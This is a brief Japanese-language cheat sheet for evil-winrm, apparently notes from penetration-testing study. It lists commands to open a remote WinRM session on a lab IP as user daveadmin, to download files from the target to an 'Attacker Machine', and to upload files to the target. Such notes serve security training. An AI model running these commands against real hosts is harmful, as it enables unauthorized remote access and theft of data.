# evil-winrm
[Documentation](https://github.com/Hackplayers/evil-winrm)

## コマンド集
1. 192.のIPにdaveadminユーザでhogeというパスワードを使用してログオンする
```
evil-winrm -i 192.168.50.220 -u daveadmin -p "hoge"
```

2. リモートセッション上で、ファイルをAttacker Machineにダウンロードする。
```
download ./hoge.txt
```

3. リモートセッション上で、Attacker Machine上のファイルをターゲットのパスにアップロードする。
```
upload <path to upload file in attackermachine>
```